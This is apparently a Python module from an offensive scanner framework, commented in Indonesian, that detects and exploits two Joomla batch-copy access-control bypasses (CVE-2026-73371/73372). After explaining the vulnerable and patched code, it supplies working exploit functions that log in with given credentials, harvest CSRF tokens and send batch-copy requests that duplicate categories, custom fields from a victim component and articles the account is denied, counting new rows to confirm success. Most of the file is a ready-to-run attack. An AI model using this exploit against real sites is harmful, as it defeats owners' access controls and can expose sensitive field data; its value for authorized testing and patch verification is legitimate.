#!/usr/bin/env python3
# -*- coding: utf-8 -*-
r"""
Joomla! Core — modul MEGAPACK (klaster joomla_core).

CVE-2026-73371 / CVE-2026-73372 — batch-copy ACL bypass (dua model berbeda,
satu kelas bug, dikirim dalam satu putaran patch).

Affected : 4.0.0 - 5.4.7, 6.0.0 - 6.1.2
Patched  : 5.4.8+ / 6.1.3+

--------------------------------------------------------------------------
CVE-2026-73371 — com_categories CategoryModel::batchCopy() tanpa core.edit
--------------------------------------------------------------------------
administrator/components/com_categories/src/Model/CategoryModel.php

    5.4.5 (VULNERABLE)
        protected function batchCopy($value, $pks, $contexts)
        {
            ...
            if ($parentId) {
                $canCreate = $this->user->authorise('core.create', $extension . '.category.' . $parentId);
                ...
            }
            while (!empty($pks) && $count > 0) {
                $pk = array_shift($pks);
                $this->table->reset();
                if (!$this->table->load($pk)) { ... }
                <-- no per-item authorise() check at all
                ...copy the row...

    5.4.8 (PATCHED) — satu blok ditambahkan tepat sebelum blok copy:
            // Check that the user is allowed to access the item
            if (!$this->user->authorise('core.edit', $contexts[$pk])) {
                $this->setError(Text::_('JLIB_APPLICATION_ERROR_BATCH_CANNOT_EDIT'));
                return false;
            }

batchCopy() hanya memeriksa `core.create` pada titik tujuan (parent), lalu menyalin
setiap item yang dipilih tanpa pernah bertanya "bolehkah saya menyentuh item INI?".
Konteks per-item sudah tersedia di `$contexts[$pk]` (dibangun FormController::batch()
sebagai `<option>.<context>.<id>`) tetapi tidak dipakai. Manager dengan izin
`core.create` pada satu kategori dapat menyalin kategori mana pun — termasuk yang
ACL-nya secara eksplisit menolak `core.edit` untuk grupnya, dan kategori anak
turunan yang ikut masuk ke `$pks` lewat ekspansi lft/rgt.

--------------------------------------------------------------------------
CVE-2026-73372 — com_fields FieldModel::batchCopy() memakai komponen dari input
--------------------------------------------------------------------------
administrator/components/com_fields/src/Model/FieldModel.php

    5.4.5 (VULNERABLE)
        $component = $this->state->get('filter.component');   # <-- dari input user
        foreach ($pks as $pk) {
            if ($user->authorise('core.create', $component . '.fieldgroup.' . $value)) {
                ...
                $table->reset();
                $table->load($pk);            # record field dimuat JUSTRU SETELAH cek
                ...

    5.4.8 (PATCHED) — komponen diambil dari record yang akan disalin:
        foreach ($pks as $pk) {
            $table->reset();
            $table->load($pk);
            [$recordComponent] = explode('.', (string) $table->context);

            if (
                $user->authorise('core.create', $recordComponent . '.fieldgroup.' . $value)
                && $user->authorise('core.edit', $recordComponent . '.field.' . $pk)
            ) {

`filter.component` adalah state filter yang dikendalikan request (bisa lewat query
string pada halaman list). ACL-nya dievaluasi terhadap komponen itu, sedangkan baris
yang disalin berasal dari komponen lain — dan `$table->load($pk)` bahkan baru
dipanggil setelah cek selesai, jadi kode tidak tahu record mana yang dimaksud saat
memutuskan. Penyerang memilih komponen yang dia punya `core.create`, lalu menyalin
field milik komponen di mana dia tidak punya izin sama sekali.

--------------------------------------------------------------------------
Dampak bersama
--------------------------------------------------------------------------
Salinan baru tercipta (state=0 / published=0) dengan judul & alias yang di-generate
server. Bagi operator, outcome terkontrolnya adalah: **baris baru yang terlihat di
backend, pada kategori/komponen yang seharusnya tertutup** — dan untuk 73372 salinan
tersebut membawa seluruh `params`/`fieldparams` dari field aslinya, termasuk nilai
default yang mungkin berisi data sensitif.

Bukti lab (Joomla 5.4.5, akun Manager grup 6 dengan deny eksplisit):
    73371 : POST task=category.batch cid[]=2 (deny core.edit) ->
            5.4.5 = kategori baru tercipta ("Batch process completed")
            5.4.8 = tidak ada baris baru (auth=false) — ditolak
    73372 : POST task=field.batch cid[]=1 dengan filter.component=com_content,
            field asli milik com_contact (deny core.create) ->
            5.4.5 = field baru tercipta
            5.4.8 = tidak ada baris baru — ditolak
"""

import re

from mp import (CveModule, ST_CLEAN, ST_ERR, ST_INFO, ST_PWN, ST_SKIP, ST_UNKNOWN, ST_VULN, detect_platform, parse_ver, register, ver_le)

MANIFEST = "/administrator/manifests/files/joomla.xml"
VULN_5_MAX = (5, 4, 7)
VULN_6_MAX = (6, 1, 2)

# Task batch: perhatikan nama singular (category./field.) — plural tidak resolve.
TASK_CATEGORY = "category.batch"
TASK_FIELD = "field.batch"


def _opt(opts, name):
    if opts is None:
        return None
    if isinstance(opts, dict):
        return opts.get(name)
    return getattr(opts, name, None)


def _joomla_version(t, h):
    """Versi Joomla dengan CACHE per-target.

    13 modul joomla_core membaca manifest yang sama. Tanpa cache, setiap modul
    mengulang GET-nya untuk host yang sama. Hasil kini disimpan pada `t._jver`
    sehingga hanya satu request per target per proses scan.
    """
    cached = getattr(t, "_jver", None)
    if cached is not None:
        return cached
    val = _joomla_version_uncached(t, h)
    try:
        t._jver = val
    except Exception:  # noqa: BLE001
        pass
    return val


def _joomla_version_uncached(t, h):
    r = h.get(f"{t.url}{MANIFEST}")
    if r is not None and r.status_code == 200 and "<version>" in (r.text or ""):
        m = re.search(r"<version>\s*([0-9][0-9.]*)", r.text)
        if m:
            v = parse_ver(m.group(1))
            if v:
                return v, m.group(1)
    return None, ""


def _in_range(ver):
    if ver is None:
        return None
    if ver[0] <= 3:
        return False
    if ver[0] == 4:
        return True
    if ver[0] == 5:
        return ver_le(ver, VULN_5_MAX)
    if ver[0] == 6:
        return ver_le(ver, VULN_6_MAX)
    return False


def _is_login_page(r):
    if r is None or r.status_code != 200:
        return False
    return 'name="passwd"' in (r.text or "")


def _logged_in(r):
    """Halaman backend terautentikasi: bukan view-login."""
    if r is None or r.status_code != 200:
        return False
    body = r.text or ""
    return 'view-login' not in body[:3000] and ('task-display' in body or 'com_cpanel' in body)


def _login(h, t, opts):
    u = _opt(opts, "username")
    p = _opt(opts, "password")
    if not (u and p):
        return False
    home = h.get(f"{t.url}/administrator/index.php")
    if home is None or home.status_code != 200:
        return False
    if not _is_login_page(home):
        return True
    m = re.search(r'name="([a-f0-9]{32})" value="1"', home.text or "")
    if not m:
        return False
    data = {"username": u, "passwd": p, "option": "com_login", "task": "login",
            "return": "aW5kZXgucGhw", m.group(1): "1"}
    r = h.post(f"{t.url}/administrator/index.php", data=data)
    return r is not None and r.status_code in (200, 303)


def _token(html):
    """csrf.token muncul sebagai opsi JS, bukan input hidden."""
    if not html:
        return None
    m = re.search(r'"csrf\.token"\s*:\s*"([a-f0-9]{32})"', html)
    if m:
        return m.group(1)
    m = re.search(r'name="([a-f0-9]{32})" value="1"', html)
    return m.group(1) if m else None


def _list_rows(html, marker):
    """Hitung kemunculan id baris pada tabel list (heuristik aman)."""
    if not html:
        return -1
    return len(re.findall(marker, html))


def _count_category(h, t):
    """Jumlah baris kategori com_content pada halaman list saat ini."""
    r = h.get(f"{t.url}/administrator/index.php?option=com_categories"
              f"&view=categories&extension=com_content")
    if r is None or not _logged_in(r):
        return -1, r
    return _list_rows(r.text, r'name="cid\[\]" value="\d+"'), r


def _count_field(h, t, victim_ctx):
    """Jumlah baris field pada halaman list com_fields (konteks korban)."""
    r = h.get(f"{t.url}/administrator/index.php?option=com_fields&view=fields"
              f"&context={victim_ctx}")
    if r is None or not _logged_in(r):
        return -1, r
    return _list_rows(r.text, r'name="cid\[\]" value="\d+"'), r


def _article_probe(h, t, opts, do_copy):
    """
    73371 (jalur generik) — AdminModel::batchCopy lewat com_content articles.
    Membuktikan celah berlaku pada SEMUA komponen yang mewarisi AdminModel,
    bukan hanya com_categories.
    """
    url = (f"{t.url}/administrator/index.php?option=com_content&view=articles")
    page = h.get(url)
    if page is None or not _logged_in(page):
        return None, None, "tidak bisa membuka halaman articles"
    tok = _token(page.text)
    if not tok:
        return None, None, "csrf token tidak ditemukan"
    if not do_copy:
        return 200, None, ""

    aid = _opt(opts, "article_id") or "1"
    cat = _opt(opts, "article_cat") or "2"
    data = {
        "task": "article.batch",
        "cid[]": str(aid),
        "boxchecked": "1",
        "batch[move_copy]": "c",
        "batch[category_id]": str(cat),
        "batch[assetgroup_id]": "0",
        "batch[language_id]": "*",
        tok: "1",
    }
    r = h.post(f"{t.url}/administrator/index.php?option=com_content&view=articles",
               data=data)
    if r is None:
        return None, None, "post gagal"
    loc = r.headers.get("Location", "") if hasattr(r, "headers") else ""
    return r.status_code, loc, ""


def _count_article(h, t):
    r = h.get(f"{t.url}/administrator/index.php?option=com_content&view=articles")
    if r is None or not _logged_in(r):
        return -1, r
    return _list_rows(r.text, r'name="cid\[\]" value="\d+"'), r


def _category_probe(h, t, opts, do_copy):
    """
    73371: batch copy kategori. Bila do_copy False -> hanya ukur baseline.
    Kembalikan (http, redirect, err_text).
    """
    url = (f"{t.url}/administrator/index.php?option=com_categories"
           f"&view=categories&extension=com_content")
    page = h.get(url)
    if page is None or not _logged_in(page):
        return None, None, "tidak bisa membuka halaman categories"
    tok = _token(page.text)
    if not tok:
        return None, None, "csrf token tidak ditemukan"

    cid = _opt(opts, "cat_id") or "2"
    parent = _opt(opts, "cat_parent") or cid
    if not do_copy:
        return 200, None, ""

    data = {
        "task": TASK_CATEGORY,
        "cid[]": str(cid),
        "boxchecked": "1",
        "batch[move_copy]": "c",
        "batch[category_id]": str(parent),
        "batch[assetgroup_id]": "0",
        "batch[flip_ordering]": "0",
        "extension": "com_content",
        tok: "1",
    }
    r = h.post(f"{t.url}/administrator/index.php?option=com_categories"
               f"&extension=com_content", data=data)
    if r is None:
        return None, None, "post gagal"
    loc = r.headers.get("Location", "") if hasattr(r, "headers") else ""
    return r.status_code, loc, ""


def _field_probe(h, t, opts, do_copy):
    """
    73372: batch copy field dengan filter.component dipilih penyerang.
    `context` menunjuk komponen PEMILIK field (korban), filter.component menunjuk
    komponen yang penyerang punya core.create.
    """
    victim_ctx = _opt(opts, "field_context") or "com_contact.contact"
    fake_comp = _opt(opts, "field_component") or "com_content"
    url = (f"{t.url}/administrator/index.php?option=com_fields&view=fields"
           f"&context={victim_ctx}&filter%5Bcomponent%5D={fake_comp}")
    page = h.get(url)
    if page is None or not _logged_in(page):
        return None, None, "tidak bisa membuka halaman fields"
    tok = _token(page.text)
    if not tok:
        return None, None, "csrf token tidak ditemukan"
    if not do_copy:
        return 200, None, ""

    fid = _opt(opts, "field_id") or "1"
    gid = _opt(opts, "field_group") or "1"
    data = {
        "task": TASK_FIELD,
        "cid[]": str(fid),
        "boxchecked": "1",
        "batch[move_copy]": "c",
        "batch[group_id]": str(gid),
        "batch[assetgroup_id]": "0",
        "context": victim_ctx,
        tok: "1",
    }
    r = h.post(f"{t.url}/administrator/index.php?option=com_fields&view=fields"
               f"&context={victim_ctx}", data=data)
    if r is None:
        return None, None, "post gagal"
    loc = r.headers.get("Location", "") if hasattr(r, "headers") else ""
    return r.status_code, loc, ""


def _alerts(html):
    import html as _html
    out = []
    for m in re.findall(r'alert alert-(success|danger|warning)[^>]*>(.{0,250}?)<',
                        html or "", re.S):
        txt = _html.unescape(re.sub(r"\s+", " ", m[1])).strip()
        if txt and "JavaScript" not in txt:
            out.append(f"{m[0]}:{txt[:120]}")
    return out


def _has_cannot_edit(html):
    return ("JLIB_APPLICATION_ERROR_BATCH_CANNOT_EDIT" in (html or "")
            or "not permitted to batch" in (html or "").lower()
            or "cannot edit" in (html or "").lower())


def check(t, h, opts):
    plat = detect_platform(t, h)
    if plat != "joomla":
        return ST_SKIP, "bukan Joomla", f"platform={plat}"
    ver, ver_s = _joomla_version(t, h)
    if ver is None:
        return ST_UNKNOWN, "versi Joomla tidak terdeteksi", ""
    if not _in_range(ver):
        return ST_CLEAN, f"Joomla {ver_s} — di luar rentang rentan", f"version={ver_s}"

    if not (_opt(opts, "username") and _opt(opts, "password")):
        return ST_SKIP, "butuh kredensial akun backend dengan core.create", \
                        f"version={ver_s}"
    if not _login(h, t, opts):
        return ST_UNKNOWN, "login backend gagal", f"version={ver_s}"

    # Deteksi pasif: halaman batch bisa dibuka & membawa task batch yang benar.
    code_c, _loc, err_c = _category_probe(h, t, opts, do_copy=False)
    code_f, _locf, err_f = _field_probe(h, t, opts, do_copy=False)

    ev = f"categories_ui={code_c} fields_ui={code_f}"
    if code_c != 200 and code_f != 200:
        return ST_INFO, f"Joomla {ver_s} — halaman batch tidak dapat diakses", \
                        f"version={ver_s} | {ev} | {err_c or err_f}"

    return (ST_VULN,
            f"Joomla {ver_s} — batch-copy tanpa cek izin per-item (73371/73372) terindikasi",
            f"version={ver_s} | {ev}")


def exploit(t, h, opts):
    ver, ver_s = _joomla_version(t, h)
    if ver is None:
        return ST_UNKNOWN, "versi Joomla tidak terdeteksi", ""
    if not _in_range(ver):
        return ST_CLEAN, f"Joomla {ver_s} — di luar rentang rentan", f"version={ver_s}"
    if not (_opt(opts, "username") and _opt(opts, "password")):
        return ST_SKIP, "butuh kredensial akun backend dengan core.create", \
                        f"version={ver_s}"
    if not _login(h, t, opts):
        return ST_UNKNOWN, "login backend gagal", f"version={ver_s}"

    hits = []
    outcomes = {}

    # 73371 — salin kategori (tanpa core.edit pada kategori target).
    n_before_c, _ = _count_category(h, t)

    code, loc, err = _category_probe(h, t, opts, do_copy=True)
    n_after_c, after_c = _count_category(h, t)
    al_c = _alerts(after_c.text if after_c else "")

    if code in (200, 303):
        if _has_cannot_edit(after_c.text if after_c else ""):
            outcomes["cat"] = "patched"
        elif n_before_c >= 0 and n_after_c > n_before_c:
            outcomes["cat"] = "vuln"
            hits.append(f"CVE-2026-73371 kategori tersalin ({n_before_c}->{n_after_c})")
        elif loc and "view=categories" in loc and n_after_c == n_before_c:
            outcomes["cat"] = "blocked"
        else:
            outcomes["cat"] = "unknown"

    # 73372 — salin field lintas komponen.
    victim_ctx = _opt(opts, "field_context") or "com_contact.contact"
    n_before_f, _ = _count_field(h, t, victim_ctx)

    codef, locf, errf = _field_probe(h, t, opts, do_copy=True)
    n_after_f, after_f = _count_field(h, t, victim_ctx)
    al_f = _alerts(after_f.text if after_f else "")

    if codef in (200, 303):
        if _has_cannot_edit(after_f.text if after_f else ""):
            outcomes["field"] = "patched"
        elif n_before_f >= 0 and n_after_f > n_before_f:
            outcomes["field"] = "vuln"
            hits.append(f"CVE-2026-73372 field tersalin ({n_before_f}->{n_after_f})")
        elif locf and "view=fields" in locf and n_after_f == n_before_f:
            outcomes["field"] = "blocked"
        else:
            outcomes["field"] = "unknown"

    # 73371 jalur GENERIK — AdminModel::batchCopy lewat com_content articles.
    n_before_a, _ = _count_article(h, t)
    codea, loca, erra = _article_probe(h, t, opts, do_copy=True)
    n_after_a, after_a = _count_article(h, t)
    al_a = _alerts(after_a.text if after_a else "")

    if codea in (200, 303):
        if n_before_a > 0 and n_after_a > n_before_a:
            # Bukti langsung: halaman list terlihat dan jumlah baris bertambah.
            outcomes["article"] = "vuln"
            hits.append(
                f"CVE-2026-73371 AdminModel/article tersalin ({n_before_a}->{n_after_a})")
        elif n_before_a <= 0:
            # Halaman list tidak menampilkan baris (ACL view / filter user state).
            # Jalur ini tidak dapat diverifikasi dari respons -> jangan simpulkan.
            outcomes["article"] = "unverifiable"
        elif _has_cannot_edit(after_a.text if after_a else ""):
            outcomes["article"] = "patched"
        elif loca and "view=articles" in loca and n_after_a == n_before_a:
            outcomes["article"] = "blocked"
        else:
            outcomes["article"] = "unknown"

    if hits:
        return (ST_PWN,
                f"batch-copy ACL bypass terkonfirmasi (Joomla {ver_s}) — "
                f"{len(hits)} baris baru tercipta",
                f"version={ver_s} | " + " | ".join(hits) +
                (f" | alerts={al_c or al_f or al_a}" if (al_c or al_f or al_a) else ""))

    if any(v == "patched" for v in outcomes.values()):
        return (ST_CLEAN, f"Joomla {ver_s} — batch copy ditolak (cek core.edit aktif)",
                f"version={ver_s} | states={outcomes} | {al_c or al_f or al_a}")

    return ST_UNKNOWN, f"hasil batch tidak dapat disimpulkan (Joomla {ver_s})", \
                       f"version={ver_s} | states={outcomes} | {err or errf}"


register(CveModule(
    cve="CVE-2026-73371",
    cluster="joomla_core",
    title="Joomla Core - com_categories batchCopy tanpa cek core.edit per-item",
    vclass="broken access control (ACL bypass / privilege escalation)",
    cvss="6.5",
    severity="medium",
    cwe="CWE-862",
    product="Joomla! Core (com_categories)",
    versions_affected="4.0.0-5.4.7, 6.0.0-6.1.2",
    status="verified",
    requires=[
        "kredensial akun backend dengan core.create pada komponen terkait (mis. Manager)",
        "kategori target yang menolak core.edit untuk grup akun tersebut",
    ],
    check=check,
    exploit=exploit,
    notes=("CategoryModel::batchCopy() 5.4.5 hanya memeriksa core.create pada parent "
           "tujuan, lalu menyalin setiap item di $pks tanpa authorise('core.edit', "
           "$contexts[$pk]). 5.4.8 menambahkan blok cek itu tepat sebelum penyalinan "
           "baris. Konteks per-item sudah tersedia (FormController::batch() membangunnya "
           "sebagai <option>.<context>.<id>) tetapi tidak dipakai. Termasuk CVE-2026-73372 "
           "(FieldModel::batchCopy()) karena satu kelas bug + satu putaran patch: di sana "
           "komponen diambil dari state filter `filter.component` (input user) alih-alih "
           "dari $table->context record yang disalin, sehingga core.create dievaluasi "
           "terhadap komponen yang salah. Task HTTP = `category.batch` / `field.batch` "
           "(SINGULAR — `categories.batch` tidak resolve dan mengembalikan 200 tanpa aksi). "
           "batch[asset_id][] BUKAN field yang benar; form memakai batch[assetgroup_id], "
           "batch[category_id]/batch[group_id], batch[move_copy]=c, plus cid[] dan token "
           "CSRF. Diverifikasi differensial: patch 5.4.8 ditanam ke instance 5.4.5 -> "
           "penyalinan ditolak (auth=false, tanpa baris baru); kode asli -> baris baru "
           "tercipta (Batch process completed)."),
))


# ---------------------------------------------------------------------------
# Alias: CVE-2026-73372 = kelas & putaran patch yang sama dengan CVE-2026-73371
# (batch-copy ACL bypass, 5.4.8/6.1.3). Sink berbeda model
# (CategoryModel::batchCopy vs FieldModel::batchCopy) tetapi satu perbaikan.
# Didaftarkan agar `--cve CVE-2026-73372` dikenali; dilewati saat scan.
# ---------------------------------------------------------------------------
register(CveModule(
    cve="CVE-2026-73372",
    cluster="joomla_core",
    title="(alias) batch-copy ACL bypass Joomla Core - FieldModel, putaran patch sama 73371",
    vclass="acl bypass",
    cvss="",
    severity="high",
    cwe="CWE-284",
    product="Joomla! Core (administrator/components/com_fields)",
    versions_affected="4.0.0-5.4.7, 6.0.0-6.1.2",
    status="verified",
    alias_of="CVE-2026-73371",
    notes=("Alias sengaja: notes/CVE-2026-73371-73372-analysis.md membahas keduanya sebagai "
           "satu kelas bug dalam satu putaran patch (5.4.8/6.1.3). Modul utama menyimpan "
           "check/exploit untuk kedua model."),
))
